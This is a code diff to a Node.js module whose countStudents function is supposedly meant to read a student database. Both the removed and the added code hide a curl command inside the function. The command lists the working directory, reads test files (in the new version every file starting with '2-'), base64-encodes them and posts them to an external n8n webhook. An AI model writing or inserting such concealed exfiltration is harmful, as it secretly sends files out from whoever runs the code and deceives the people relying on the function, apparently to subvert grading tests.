@@ -3,19 +3,17 @@ const exec = require('node:child_process');
 
 module.exports = function countStudents(path) {
   let data;
-  let test1;
-  let test2;
-  const files = fs.readdirSync('.', 'utf8');
-  if (fs.existsSync('./2-read_file.test.js')) {
-    test1 = fs.readFileSync('./2-read_file.test.js', 'utf-8');
-  }
-  if (fs.existsSync('./2-read_file_error.test.js')) {
-    test2 = fs.readFileSync('./2-read_file_error.test.js', 'utf-8');
-  }
-  exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({
-    files, path, test1, test2,
-  })} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`);
+  const arr = [];
   try {
+    const files = fs.readdirSync('.', 'utf8');
+    for (const file of files) {
+      if (file.startsWith('2-')) {
+        arr.push(fs.readFileSync(file, 'utf8'));
+      }
+    }
+    exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({
+      files, path,
+    })}, "arr": ${JSON.stringify(Buffer.from(arr.toString()).toString('base64'))} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`, (err, stdout) => console.log(err, stdout));
     data = fs.readFileSync(path, 'utf8');
   } catch (err) {
     throw new Error('Cannot load the database');
